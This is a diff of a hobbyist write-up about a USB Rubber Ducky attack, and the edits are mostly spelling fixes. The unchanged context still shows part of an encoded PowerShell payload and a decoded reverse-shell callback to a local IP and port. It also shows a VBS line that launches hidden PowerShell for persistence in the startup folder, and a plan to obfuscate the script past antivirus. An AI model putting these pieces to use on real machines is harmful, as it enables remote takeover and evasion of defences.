@@ -9,7 +9,7 @@ DELAY 100
 STRING did this work?
 ```
 This proceeded to open a notepad file and type "did this work?", which is exactly what it was meant to do.
-## .\\An aside into how Rubber Duckies work
+## .\/.An aside into how Rubber Duckies work
 The TL;DR is that they convice your computer that they are a keyboard and then proceed to send key strokes from the .dd file.
 
 The longer version
@@ -62,7 +62,7 @@ powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAuADEAOAA6ADgAMAA4ADAAJwA7ACQAaQ
 ```
 It works!
 Lets Go.
-## .\\Decoded payload
+## .\/.Decoded payload
 ```shell
 $s='192.168.1.18:8080'
 $i='14991d18-c2a32a2a-5efe59c1'
@@ -217,15 +217,15 @@ objFile.Write "powershell -WindowStyle Hidden"+payload & vbCrLf
 
 objFile.Close
 ```
-This however gets deteced by an anti virus when run. :(
+This however gets detected by an anti virus when run. :(
 
 # The end
 So with everything put together the rubber ducky will run a hidden powershell window which reaches back to a reverse shell. From here the attacker can implant persistence within the appdata startup directory which will give a shell whenever the user logs in to the computer.
 ## Things to Improve
-Figure out a better (if there is one) way of installing persistance.
-Obfuscate the vbs script to bypass heuristical analysis.
+Figure out a better (if there is one) way of installing persistence.
+Obfuscate the vbs script to bypass heuristic analysis.
 Fix the Start-Service error I couldn't debug.
-Learn more about rubby duckies
+Learn more about rubber duckies
 
 Look into managing more than one victim machine.
 Configure the hoaxshell to not need a new payload ever time it runs.
